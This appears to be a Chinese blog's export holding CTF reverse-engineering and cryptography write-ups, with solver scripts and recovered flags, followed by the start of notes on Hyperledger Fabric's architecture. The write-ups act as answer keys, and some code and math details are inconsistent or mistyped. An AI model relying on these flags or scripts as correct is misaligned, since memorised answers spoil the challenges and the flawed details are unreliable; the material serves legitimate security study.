% 3 == 1 ) { a3[--v19] = 61; } else if ( a2 % 3 != 2 ) { goto LABEL_15; } a3[v19 - 1] = 61; 将每一位减少61后映射到base64的字符串上就可以得到base64结果\nstr = \u0026#39;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\\\\vZE\u0026#39; # 注意转义字符 base = \u0026#39;\u0026#39; map = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; for c in str: base += map[ord(c) - 61] print (base) # base = \u0026#39;djX99X1H/pUTeiZZP/8xoYV8YwJuvZNqPk2N1ydzLV7MYvLf5dI\u0026#39; # 最后再补充一个 \u0026#39;=\u0026#39; 即可 破解完这个函数后再查看上两个函数\n根据调用判断第一个函数为第二个函数提供密钥，这个应该是固定结果，动态调试即可得到\n查看第二个函数\nfor ( i = 0; i \u0026lt; a3; ++i ) { v7 = (unsigned __int8)(v7 + 1); v3 = *(_DWORD *)(4LL * v7 + v9); v8 = (unsigned __int8)(v8 + v3); v4 = *(_DWORD *)(4LL * v8 + v9); *(_DWORD *)(v9 + 4LL * v7) = v4; *(_DWORD *)(v9 + 4LL * v8) = v3; *(_BYTE *)(i + a2) ^= *(_BYTE *)(4LL * (unsigned __int8)(v3 + v4) + v9); } 这对输入的每一位做了个异或运算，异或的数字也是固定的，直接进行动态调试即可（根据经验猜测是RC4或者与其类似）\n根据base64的位数得知flag最多有39位\n进行动态调试\ngdb-peda$ start gdb-peda$ c Continuing. please input your flag:flag{abcdefghijklmnopqrstuvwxyz0123456} [----------------------------------registers-----------------------------------] RAX: 0x27 (\u0026#34;\u0026#39;\u0026#34;) RBX: 0x0 RCX: 0x0 RDX: 0x7ffffffed9c0 (\u0026#34;flag{abcdefghijklmnopqrstuvwxyz0123456}\u0026#34;) RSI: 0x7ffffffed9b0 --\u0026gt; 0x4010202030302010 RDI: 0x7ffffffed9e0 --\u0026gt; 0x7d363534333231 (\u0026#39;123456}\u0026#39;) RBP: 0x7ffffffeded0 --\u0026gt; 0x400c80 --\u0026gt; 0x41ff894156415741 RSP: 0x7ffffffed590 --\u0026gt; 0x0 RIP: 0x400bbc --\u0026gt; 0xfffaf08d8d48c289 R8 : 0x0 R9 : 0x0 R10: 0x3 R11: 0x7fffff18ee90 (\u0026lt;__memset_avx2_unaligned_erms\u0026gt;: vmovd xmm0,esi) R12: 0x4005c0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffedfb0 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400bad: lea rax,[rbp-0x510] 0x400bb4: mov rdi,rax 0x400bb7: call 0x400550 \u0026lt;strlen@plt\u0026gt; =\u0026gt; 0x400bbc: mov edx,eax 0x400bbe: lea rcx,[rbp-0x510] 0x400bc5: lea rax,[rbp-0x930] 0x400bcc: mov rsi,rcx 0x400bcf: mov rdi,rax [------------------------------------stack-------------------------------------] 0000| 0x7ffffffed590 --\u0026gt; 0x0 0008| 0x7ffffffed598 --\u0026gt; 0x5f4f636d (\u0026#39;mcO_\u0026#39;) 0016| 0x7ffffffed5a0 --\u0026gt; 0x0 0024| 0x7ffffffed5a8 --\u0026gt; 0x31000000b0 0032| 0x7ffffffed5b0 --\u0026gt; 0x7000000075 (\u0026#39;u\u0026#39;) 0040| 0x7ffffffed5b8 --\u0026gt; 0xdf000000f8 0048| 0x7ffffffed5c0 --\u0026gt; 0x3c00000007 0056| 0x7ffffffed5c8 --\u0026gt; 0x7100000078 (\u0026#39;x\u0026#39;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 2, 0x0000000000400bbc in ?? () gdb-peda$ x/10x $rdx 0x7ffffffed9c0: 0x6362617b67616c66 0x6b6a696867666564 0x7ffffffed9d0: 0x737271706f6e6d6c 0x307a797877767574 0x7ffffffed9e0: 0x007d363534333231 0x0000000000000000 0x7ffffffed9f0: 0x0000000000000000 0x0000000000000000 0x7ffffffeda00: 0x0000000000000000 0x0000000000000000 gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] RAX: 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 RBX: 0x0 RCX: 0x138 RDX: 0x1c RSI: 0x7d (\u0026#39;}\u0026#39;) RDI: 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 RBP: 0x7ffffffeded0 --\u0026gt; 0x400c80 --\u0026gt; 0x41ff894156415741 RSP: 0x7ffffffed590 --\u0026gt; 0x0 RIP: 0x400bd7 --\u0026gt; 0x48fffffaf0858d48 R8 : 0x0 R9 : 0x0 R10: 0x3 R11: 0x7fffff18ee90 (\u0026lt;__memset_avx2_unaligned_erms\u0026gt;: vmovd xmm0,esi) R12: 0x4005c0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffedfb0 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400bcc: mov rsi,rcx 0x400bcf: mov rdi,rax 0x400bd2: call 0x4007db =\u0026gt; 0x400bd7: lea rax,[rbp-0x510] 0x400bde: mov rdi,rax 0x400be1: call 0x400550 \u0026lt;strlen@plt\u0026gt; 0x400be6: mov esi,eax 0x400be8: lea rcx,[rbp-0x93c] [------------------------------------stack-------------------------------------] 0000| 0x7ffffffed590 --\u0026gt; 0x0 0008| 0x7ffffffed598 --\u0026gt; 0x5f4f636d (\u0026#39;mcO_\u0026#39;) 0016| 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 0024| 0x7ffffffed5a8 --\u0026gt; 0x67000000b0 0032| 0x7ffffffed5b0 --\u0026gt; 0x4b000000b8 0040| 0x7ffffffed5b8 --\u0026gt; 0xe000000069 0048| 0x7ffffffed5c0 --\u0026gt; 0x3f000000b9 0056| 0x7ffffffed5c8 --\u0026gt; 0xc5000000ec [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 3, 0x0000000000400bd7 in ?? () gdb-peda$ x/10x 0x7ffffffed9c0 0x7ffffffed9c0: 0xc6ad437df5fd3576 0xa862a26e0d237b16 0x7ffffffed9d0: 0x2c84ae7c0c342488 0x5e656c6895cb5d7c 0x7ffffffed9e0: 0x00e699b5d8f9689b 0x0000000000000000 0x7ffffffed9f0: 0x0000000000000000 0x0000000000000000 0x7ffffffeda00: 0x0000000000000000 0x0000000000000000 将输入在函数执行前后两次的结果进行异或即可得到异或的数字，再与base64解码的结果进行异或即可，注意大小端问题\nfrom libnum import n2s, s2n before = 0x7d363534333231307a797877767574737271706f6e6d6c6b6a6968676665646362617b67616c66 after = 0xe699b5d8f9689b5e656c6895cb5d7c2c84ae7c0c342488a862a26e0d237b16c6ad437df5fd3576 flag = b\u0026#34;v5\\xfd\\xf5}G\\xfe\\x95\\x13z\u0026amp;Y?\\xff1\\xa1\\x85|c\\x02n\\xbd\\x93j\u0026gt;M\\x8d\\xd7\u0026#39;s-^\\xccb\\xf2\\xdf\\xe5\\xd2\u0026#34;[::-1] print (len(flag)) print (n2s(s2n(flag) ^ before ^ after)[::-1]) # b\u0026#39;flag{e10adc3949ba59abbe56e057f20f883e}\\x9b\u0026#39; 得到flag\nflag{e10adc3949ba59abbe56e057f20f883e}\n[MRCTF2020]Transform dword = [ 9, 0xa, 0xf, 0x17, 0x7, 0x18, 0xc, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0b, 0x1e, 0x1b, 0x16, 0x4, 0x0d, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1f, 0x8, 0x12, 0x1a, 0x1c, 0xe, 0 ] flag = [ 0x67, 0x79, 0x7b, 0x7f, 0x75, 0x2b, 0x3c, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D, 0x3f] print(len(dword), len(flag)) for i in range(len(dword)): flag[i] ^= dword[i] code = [ 0 for i in range(33)] for i in range(len(dword)): code[dword[i]] = flag[i] for i in range(len(code)): print(chr(code[i]), end = \u0026#39;\u0026#39;) print() flag: MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}\n[MRCTF2020]Xor flag = \u0026#39;MSAWB~FXZ:J:`tQJ\u0026#34;N@ bpdd}8g\u0026#39; for i in range(27): print(chr(ord(flag[i]) ^ i), end=\u0026#39;\u0026#39;) print() flag: MRCTF{@_R3@1ly_E2_R3verse!}\n[MRCTF2020]hello_world_go .rodata:00000000004D3C58 unk_4D3C58 db 66h ; f ; DATA XREF: main_main:loc_49A40A↑o .rodata:00000000004D3C58 ; main_main+25C↑o .rodata:00000000004D3C59 db 6Ch ; l .rodata:00000000004D3C5A db 61h ; a .rodata:00000000004D3C5B db 67h ; g .rodata:00000000004D3C5C db 7Bh ; { .rodata:00000000004D3C5D db 68h ; h .rodata:00000000004D3C5E db 65h ; e .rodata:00000000004D3C5F db 6Ch ; l .rodata:00000000004D3C60 db 6Ch ; l .rodata:00000000004D3C61 db 6Fh ; o .rodata:00000000004D3C62 db 5Fh ; _ .rodata:00000000004D3C63 db 77h ; w .rodata:00000000004D3C64 db 6Fh ; o .rodata:00000000004D3C65 db 72h ; r .rodata:00000000004D3C66 db 6Ch ; l .rodata:00000000004D3C67 db 64h ; d .rodata:00000000004D3C68 db 5Fh ; _ .rodata:00000000004D3C69 db 67h ; g .rodata:00000000004D3C6A db 6Fh ; o .rodata:00000000004D3C6B db 67h ; g .rodata:00000000004D3C6C db 6Fh ; o .rodata:00000000004D3C6D db 67h ; g .rodata:00000000004D3C6E db 6Fh ; o .rodata:00000000004D3C6F db 7Dh ; } [MRCTF2020]PixelShooter 先使用NoxPlayer打开这个apk，发现游戏结束后有个flag信息，说得分不够高，说明flag会在游戏结束时根据得分获得\n使用apktool解压\n$ java -jar apktool_2.5.0.jar d PixelShooter.apk 这个显然是unity3d逆向，找到 /assets/bin/Data/Managed，使用 dnSpy打开 Assembly-CSharp.dll\n看到有个gameController，其中有个gameOver\npublic void GameOver() { this.isGameOver = true; this.UI.GetComponent\u0026lt;UIController\u0026gt;().GameOver(this.score, this.bestScore); if (PlayerPrefs.HasKey(\u0026#34;bestScore\u0026#34;)) { this.bestScore = Mathf.Max(this.score, PlayerPrefs.GetInt(\u0026#34;bestScore\u0026#34;)); } else { this.bestScore = this.score; } base.GetComponent\u0026lt;AudioSource\u0026gt;().Stop(); } 有个获取ui的函数，查看\npublic void GameOver(int score, int bestScore) { this.pad.SetActive(false); Time.timeScale = 0f; string text = \u0026#34;您的飞机已坠毁\\n\u0026#34;; if (bestScore \u0026lt; score) { string text2 = text; text = string.Concat(new object[] { text2, \u0026#34;获得最高分:\u0026#34;, score, \u0026#34;!\\n\u0026#34; }); PlayerPrefs.SetInt(\u0026#34;bestScore\u0026#34;, score); } if (score \u0026lt; 20) { text += \u0026#34;少年继续努力！要拿到flag还差亿点点\\n\u0026#34;; } else if (score \u0026lt; 100) { text += \u0026#34;战绩不错！但是要拿到flag还差亿点\u0026#34;; } else if (score \u0026lt; 500) { text += \u0026#34;惊人的成绩！！但是要拿到flag还差一点\\n\u0026#34;; } else { text += \u0026#34;MRCTF{Unity_1S_Fun_233}\\n\u0026#34;; } if (Time.time - this.lastTime \u0026lt; 15f) { text += \u0026#34;以及，别作死啊！\\n\u0026#34;; } else if (Time.time - this.lastTime \u0026lt; 60f) { text += \u0026#34;以及注意闪避！\u0026#34;; } this.gameOverText.text = text; this.gameOverUI.SetActive(true); } 拿到flag\n","date":"2021-01-15T18:29:48Z","image":"/post/reverse-from-0-to-1/cover_hu1385a0e9a9a82b1c72526aa43682148d_1249114_120x120_fill_q75_box_smart1.jpg","permalink":"/post/reverse-from-0-to-1/","title":"Reverse from 0 to 1"},{"content":"Quiz from bzb 前言\u0026amp;题目 前段时间学习信安数基，助教学长就配套出了道Quiz，来给我们练手。\n先上题目\nimport math from AITMCLab.Crypto.Util.number import long_to_bytes from AITMCLab.Crypto.Util.number import bytes_to_long from AITMCLab.Crypto.Util.number import getRandomNBitInteger from AITMCLab.Crypto.Util.number import getPrime from AITMCLab.Crypto.Util.number import isPrime from AITMCLab.Crypto.Util.number import inverse from secret import flag def nextPrime(n): n += 2 if n \u0026amp; 1 else 1 while not isPrime(n): n += 2 return n def init(S, K): j = 0 k = [] K = list(K) for i in range(len(K)): K[i] = ord(K[i]) for i in range(256): S.append(i) k.append(K[i % len(K)]) for i in range(256): j = (j + S[i] + k[i]) % 256 S[i], S[j] = S[j], S[i] def Encrypt(key, D): S=[] init(S, key) i = j = 0 result = \u0026#39;\u0026#39; for a in D: a = ord(a) i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = chr(a ^ S[(S[i] + S[j]) % 256]) result += k return result def Decrypt(key, D): S = [] init(S, key) i = j = 0 result = \u0026#39;\u0026#39; for a in D: a = ord(a) i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = chr(a ^ S[(S[i] + S[j]) % 256]) result += k return result if __name__ == \u0026#34;__main__\u0026#34;: key = long_to_bytes(getRandomNBitInteger(100)) print \u0026#39;key =\u0026#39;, bytes_to_long(key) e = getPrime(512) print \u0026#39;e =\u0026#39;, e E = nextPrime(e) f = math.factorial(e) % E d = long_to_bytes(f) c1 = bytes_to_long(Encrypt(key, d)) print \u0026#39;c1 =\u0026#39;, c1 c2 = bytes_to_long(Encrypt(key, flag)) print \u0026#39;c2 =\u0026#39;, c2 # e = 11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457 # c1 = 11792816667683654209610238149228683194178884298019505853565076663183883681365400495420305428570416004628438524072440231323696408946395141935772862600031614 # c2 = 81946333492800053045881242964212560642046177081574600318494251620269838444004879162713842 思路 首先阅读主函数部分，显然这道题需要先通过e, E求解f，以此得到d，随后再利用d, c1, c2来求解flag。\n求解f 题目中的 $f=e!\\mathrm{mod} E$ ，但由于 e 过大，显然无法直接计算得到。观察发现，$e!$ 当中的绝大多数部分可以两两配对组成模 $E$ 的逆元，因此猜测可能存在类似于 $(E-1)!\\equiv 1\\ (\\mathrm{mod}\\ E)$ 的规律，如果满足这个规律，我们就可以通过计算 $\\prod\\limits_{i=e+1}^{E-1}i\\ (\\mathrm{mod}\\ E)$ 的逆元得到f。\n经过几次简单的检验，猜测规律为 $(E-2)!\\equiv 1\\ (\\mathrm{mod}\\ E)$ （后得知为Wilson定理，当时还没学\u0026hellip;），因此只需要计算$tmp\\equiv \\prod\\limits_{i=e+1}^{E-2}i\\ (\\mathrm{mod}\\ E),\\ f\\cdot tmp\\equiv 1\\ (\\mathrm{mod}\\ E)$ 即可得到 $f$。\n求解flag 得到了 f 后，可以直接利用 long_to_bytes(f) 来得到 d 。为求解 flag，初步设想为利用加密函数求解 key，随后直接利用解密函数求解 flag。阅读 Encrypt 函数和 Decrypt 函数后发现加解密函数完全一致，且实际的加解密过程只有异或运算，说明 d 到 c1 的运算步骤与 flag 到 c2 的运算步骤完全相同且可逆，因此求解时没必要求出 key。进一步分析后发现加密算法大致是将 key 转化成某个固定的数组，并与明文依次进行异或运算得到密文，也就是说经过了 init 函数和多次交换位置（交换的次序也是固定的）后的数列才是真正的密钥。\n因此，只需要将 c1, c2 和 d 转换成 bytes，然后对每一位取 ord 后进行异或运算，组成的数字取 chr 后加到答案字符串后面，即可得到 flag。\nexp import math from AITMCLab.libnum.modular import invmod from AITMCLab.Crypto.Util.number import long_to_bytes from AITMCLab.Crypto.Util.number import bytes_to_long from AITMCLab.Crypto.Util.number import isPrime def nextPrime(n): n += 2 if n \u0026amp; 1 else 1 while not isPrime(n): n += 2 return n if __name__ == \u0026#34;__main__\u0026#34;: e = 11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457 c1 = 5120829596353532760839054347975234579355835073413768618360492980516438193909447500996222328143719619379838946544412967584025416378147246422705451415437468 c2 = 17985907282297772406857113433926323639543183645704827789984971602150950301590677893419082 E = nextPrime(e) f_1 = 1 i = e + 1 while i \u0026lt; E - 1: f_1 *= i f_1 %= E i += 1 f = invmod(f_1, E) # 以上为求解f的过程 d = long_to_bytes(f) c1_bytes = long_to_bytes(c1) c2_bytes = lone_to_bytes(c2) flag = \u0026#34;\u0026#34; for i in range(len(c2_bytes)): flag += chr(ord(c2_bytes[i]) ^ ord(c1_bytes[i]) ^ ord(d[i])) print flag # flag{Congratulation!_quiz1_passed!!!} [DAS2020 April]not RSA 题目 from AITMCLab.libnum import gcd, invmod, s2n from Crypto.Util.number import isPrime from secret import flag p = 104879397075344024438671231239628115011303349344697797964879592144922079000957 q = 104879397075344024438671231239628115011303349344697797964879592144922079001013 assert isPrime(p) and isPrime(q) n = p * q flag = s2n(flag) r = randint(1, n) c = (pow(n + 1, flag, n * n) * pow(r, n, n * n)) % (n * n) print c # c = 13134489820394613222282607681686272081419875146946401883172682167011759113388373349180457979897848113275982219264879081189886853062717764580364698888338032141434053832247476010400449272010082460437747190468766740274587999336359171283098137261396013153130265440425676242061845667887640808895666325466803989428 思路 代码很简单，就是道纯数学题\n由源码：\n$c\\equiv (n+1)^f\\cdot r^n\\ (\\mathrm{mod}\\ n^2)$\n根据二项式定理：\n$c\\equiv (fn+1)\\cdot r^n\\ (mod\\ n^2)$\n左右两式同乘 $\\varphi(n)$ 次方，得 $c^{\\varphi(n)}\\equiv (fn+1)^{\\varphi(n)}\\cdot r^{n\\varphi(n)}\\ (mod\\ n^2)$\n由 $\\varphi(n^2)=n\\cdot \\varphi(n)$ 且当 $r\\neq p$ 或 $r\\neq q$ 时有，$gcd(r,n)=1$ 可知，$r^{n\\varphi(n)}\\equiv 1\\ (mod\\ n^2)$，可得：\n$c^{\\varphi(n)}\\equiv (fn+1)^{\\varphi(n)}\\ (mod\\ n^2)$\n因为 r 为随机数，所以 $r\\neq p,q$ 的概率为 $\\dfrac{2}{n}$，可认为 $gcd(r,n)=1$ 成立。\n再次使用二次项定理，可得 $c^{\\varphi(n)}\\equiv fn\\varphi(n)+1\\ (mod\\ n^2)$\n由费曼小定理可知 $c^{\\varphi(n)}\\equiv 1\\ (mod\\ n)$，即 $n|c^{\\varphi(n)}-1$，因此将1移到同余式左边并对同余式同除n，得：\n$\\dfrac{c^{\\varphi(n)}-1}{n}\\equiv f\\varphi(n)\\ (mod\\ n)$\n对于左式，设 $\\dfrac{c^{\\varphi(n)}-1}{n}=kn+r'$\n$c^{\\varphi(n)}=kn^2+rn+1$\n只需求解出 $rn+1$ 即可，因此可以对 $c^{\\varphi(n)}$ 进行模 $n^2$，实现时可直接使用 python 中的 pow 函数。\n将左式求解后，化为求解 $\\varphi(n)\\cdot f\\equiv r'\\ (mod\\ n)$，即 $f\\equiv \\varphi(n)^{-1}\\cdot r'\\ (mod\\ n)$\n代码 from AITMCLab.libnum import s2n, invmod, n2s c = 131344898203946132222826076816862720814198751469464018831726821670 117591133883733491804579798978481132759822192648790811898868530627 177645803646988883380321414340538322474760104004492720100824604377 471904687667402745879993363591712830981372613960131531302654404256 76242061845667887640808895666325466803989428 p = 104879397075344024438671231239628115011303349344697797964879592144 922079000957 q = 104879397075344024438671231239628115011303349344697797964879592144 922079001013 phi_n = (p - 1) * (q - 1) n = p * q r = (pow(c, phi_n, n * n) - 1) // n print n2s(r * invmod(phi_n, n) % n) # flag{can_you_find_me??} 总结 纯数学题\n学长带着推了一遍。。。这也太难了。。。\n听说是 paillier 加密，果然是 not RSA\n[N1CTF2019]BabyRSA 题目 from Crypto.Util import number import random from secret import flag N = 23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629 e = 0x10001 m = number.bytes_to_long(flag) with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;w\u0026#39;) as f: while m: padding = random.randint(0, 2**1000) ** 2 message = padding \u0026lt;\u0026lt; 1 + m % 2 cipher = pow(message, e, N) f.write(hex(cipher)+\u0026#39;n\u0026#39;) m /= 2 思路 首先阅读代码。\nwhile m: # several operations m /= 2 由上述代码部分以及过程中出现了 m % 2 操作可知，flag 的二进制数据每一位被存进了 key.enc 文件的每行数据中，因此对 key.enc 文件的每一行进行读取，只要能够判断该位为0还是1，即可完成解密。\npadding = random.randint(0, 2**1000) ** 2 message = padding \u0026lt;\u0026lt; pow(m, p - 1, p) + m % 2 cipher = pow(message, e, N) 由上述代码可知，$c\\equiv m^e\\ (\\mathrm{mod}\\ N), m = r^2\\cdot 2^{1+flag%2}$ （r为random结果），因此 m % 2 = 1 时，有$c\\equiv r^2\\cdot 2^2\\equiv (2^er^e)^2\\ (\\mathrm{mod}\\ N)$，而 m % 2 = 0 时，有$c\\equiv 2^e\\cdot r^{2^e}$。\n首先猜测可以通过破解RSA密码，将加密信息还原为明文信息，判断该数整除 2 的奇数次方还是偶数次方即可得知该位的二进制数。使用 factordb 网站失败后贼心不死，又尝试了网上找的多种攻击脚本，发现均无法分解，于是寻找其它方法。\n观察README.md发现，本题可以尝试用二次剩余求解。m % 2 = 1 时，有 $c\\equiv (2^er^e)^2\\ (\\mathrm{mod}\\ N)$，m% 2 = 0 时，有 $c\\equiv (2\\cdot r^2)^e\\ (\\mathrm{mod}\\ N)$，因此，当 c 为 N 的二次剩余时，对应m % 2 = 1，c 为 N 的二次非剩余时，对应 m % 2 = 0。\n可以使用 Jacobi 判断是否为二次剩余。只需满足 $\\left(\\dfrac{2^e\\cdot r^{2^e}}{N}\\right)=-1$ 即可求解。由于 $\\left(\\dfrac{2^e\\cdot r^{2^e}}{N}\\right)=\\left(\\dfrac{2}{p}\\right)\\left(\\dfrac{2}{q}\\right)$，所以当 m % 2 = 0 时，Jacobi 计算结果仅取决于 p 和 q，且在实际计算中发现存在 Jacobi 计算结果为 -1 的情况，又因为 m % 2 = 1 时 Jacobi 计算结果必然为 1，说明本题中 2 分别是 p 和 q 的二次剩余和二次非剩余，可得\n当 $m\\equiv 0\\pmod 2$，$\\left(\\dfrac{c}{N}\\right)= \\left(\\dfrac{2}{p}\\right)\\left(\\dfrac{2}{q}\\right)=-1$\n当 $m\\equiv 1\\pmod 2$，$\\left(\\dfrac{c}{N}\\right)= 1$\n因此可以用 Jacobi 来计算 flag 的二进制结果。\nexp from AITMCLab.Crypto.Util.number import long_to_bytes def jacobi(a, b): res = 1 if a == 2: return (-1) ** ((b * b - 1) / 8) if a == b - 1: return (-1) ** ((b - 1) / 2) if a == 1: return 1 while a % 2 == 0: res *= jacobi(2, b) a /= 2 res *= (-1)**((a - 1) * (b - 1) / 4) * jacobi(b % a, a) return res n = 23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629 flag = 0 i = 0 with open(\u0026#39;key.enc\u0026#39;, \u0026#39;r\u0026#39;) as f: for line in f: line = line.strip(\u0026#34;L\\n\u0026#34;) # Filter out \u0026#34;L\\n\u0026#34; at the end of line cur = int(line, 16) # Convert hax string to number if (jacobi(cur, n) == 1): flag += 1 \u0026lt;\u0026lt; i i += 1 print flag print flag print long_to_bytes(flag) # N1CTF{You_can_leak_the_jacobi_symbol_from_RSA} 首先从key.enc中逐行读取，并对每一行结尾的\u0026rsquo;L\\n\u0026rsquo;进行过滤，将其转换为整数cur后，计算Jacobi符号$J\\left( cur, N\\right)$。计算Jacobi符号时主要使用二次互反律进行计算（可以再使用其它定律进行加速，但没必要）。\n由于第一行储存的为flag的最后一位（即从后往前储存），因此进行flag += 1 \u0026lt;\u0026lt; i即可将相应位置的二进制结果还原。\n总结 这道题在代码阅读上难度较低，唯一需要留意的地方就是padding \u0026lt;\u0026lt; pow(m, p - 1, p) + m % 2这个运算的优先级问题（感谢bg的注释提示）。把代码转换成数学公式后，二次剩余的方法就比较明显了，需要注意的是Jacobi符号无法准确判断二次剩余与二次非剩余（感谢bg指出了这个问题），简单推导后发现这个方法有一定的使用条件，如果题目中的p和q不满足一定的条件，这个方法就无法正确区分0和1。\n 后经 ssgss 师傅提醒发现这道题用的是 Goldwasser-Micali 密码（上课走神实锤了）。简单对比发现，当GM密码选取的x满足 J(x, p) = 1 且 J(x, q) = -1 时，可能能够利用本题的方法进行破解。因此选取的 x 不能仅满足是 n 的二次非剩余，需要同时是 p 和 q 的二次非剩余。\n ","date":"2020-12-09T23:27:25Z","permalink":"/post/aitmc-challenge/","title":"AITMC-challenge"},{"content":"参考文献：Hyperledger Fabric: A Distributed Operation System for Permissioned Blockchains\n架构 整体结构 Fabric是一个许可区块链的分布式操作系统，可以执行多种编程语言编写的分布式应用。它能够在一个只能追加的数据结构中安全地跟踪执行历史，并且没有内置的加密账本。\nFabric使用了“执行-order-验证”的区块链架构，而没有遵顼标准的“order-执行”设计。其整体的分布式应用可以分为两个部分\n  智能合约，称为链码 (Chaincode) ，是一段实现了应用逻辑的程序代码，并在执行过程中运行。链码是Fabric分布式应用的核心部分，可能会被未受信任的开发者修改。有一种特殊的链码被用于管理区块链系统并维护参数，被称为系统链码 (system chaincode)\n  背书政策 (endorsement policy) 在验证阶段进行评价。许可政策无法被未受信任的开发者选择或修改。其在区块链中充当一个用于事物验证的静态库，且只能通过链码进行参数化。只有指定的管理员有权限使用系统管理功能修改。\n  “执行-排序-验证”结构示意图：\n\r\n一个客户端向背书政策指定的peer节点(peers)发送交易。这个交易被特殊的peer节点执行并且记录输出信息，这一步骤被称为背书。执行完成后，交易进入了排序(ordering)阶段，在这一个阶段中，使用了一种可插入的共识协议来产生一个完成排序的已背书交易的序列，并按区块分组。这些交易被广播到所有的节点。这个序列的顺序由输出和状态的依赖性决定。在验证阶段，每个peer节点都需要根据背书政策和执行的一致性对已背书交易的状态变化进行验证。所有peer节点都已相同的顺序进行验证，因此结果具有确定性。\nFabric网络支持多个区块链链接到同一个排序服务上。每个区块链被称为一个通道(Channel)，可以有不同的peer节点作为其成员。这些通道可以被用来分离不同的区块链之间的状态，但每个通道的共识并不一致，并且通道中的交易顺序是相互分开的。认为所有排序都是可信的部署，可以通过通道访问控制来实现对节点的控制。\n其中的节点可分为：客户端、peer节点（其中一部分为背书节点）、排序服务节点(OSN, Ordering Service Nodes or orderers)\n交易的三个阶段 \rtransaction_flow\r\n执行阶段 在执行阶段，客户端签署并发送一个交易提案给一个或多个背书节点来执行（根据背书政策，每个chaincode都有特定的一组背书节点）。一个交易提案包含了提交客户端的身份（根据MSP），交易的载荷、参数、链码标识符、每个客户端只能使用一次的nonce（随机值或计数器），以及客户端标识符和nonce生成的交易标识符。\n背书节点会对交易提案进行模拟，在指定的区块链链码上执行操作。模拟操作在背书节点的本地区块链状态中进行模拟，不与其它节点同步，也不会将模拟的结果永久化到帐本中。区块链的状态仍然由节点交易管理器(Peer Transaction Manager)维护。一个链码创建的状态只能限定在该链码上，不能被其他的链码直接访问。需要注意的是，链码只能维护GetState、PutState、DelState操作访问的内容（可能意思是：需要使用这些接口进行访问，不能直接修改，猜测状态权限为private）。给予适当的权限，链码可以调用同一个通道的链码，并访问其状态。\n在模拟后，背书节点会产生一个writeset，其中包括模拟产生的状态更新，和一个readset，代表交易提案模拟的版本依赖（模拟时的所有密钥以及对应的版本号）。在模拟结束后，背书节点会以加密的方式签署一份“背书”消息，包括了writeset和readset（包括交易id和背书节点的一些数据），随后以响应的方式发送给客户端。客户端收集背书，直到满足链码的背书政策，开始交易。特别的，这要求政策决定的所有背书节点都返回相同的writeset和readset。然后，客户端将继续创建交易，并传递给排序阶段。\n排序阶段 客户端收集到足够的背书后，将会把交易组装起来并发送给排序服务端。整个交易包括了载荷(payload)（包括参数的链码操作）、交易元数据、背书的集合。排序阶段对每个通道的所有提交建立了一个排序。排序服务端会将多个交易分成块，输出包含交易的哈希链序列，以提高广播协议的吞吐量。\n broadcast(tx)：客户端调用这个函数来广播交易tx，包含了载荷和签名。 B $\\leftarrow$ deliver(s)：客户端调用这个函数来获取非负序列号s的区块B，$B=([tx_1,tx_2,\\ldots,tx_k],h)$，$h$为s-1区块的哈希值。  排序服务确保了一个通道中的交付区块被完全排序，确保安全。\n然而，每一个单独的排序实现都允许在客户端请求中保证自己的活跃性与公平性。\n由于区块链中包含了大量的节点，但仅有少部分节点实现了排序服务，因此Fabric可以配置使用内置的gossip服务，将排序服务中交付的区块分发给所有的节点。\n验证阶段 排序服务会把区块直接分发给各个节点（或通过gossip）。随后，一个新的区块进入验证阶段，包含三个连续步骤：\n 并行执行区块中所有的交易的背书政策评估。评估是验证系统链码(VSCC, validation system chaincode)的任务。VSCC是一个静态库，是区块链配置的一部分，负责根据链码中的背书政策验证背书。如果不满足，这个交易会被标记为无效，并被忽略。 对块中的所有交易进行读写冲突检查(read-write conflict check)（版本号比较）。对于每个交易，将会对比其中readset的版本号和节点本地存储的账本当前状态中的版本号，确保版本相同。如果版本不匹配，交易会被标记为无效，并被忽略。 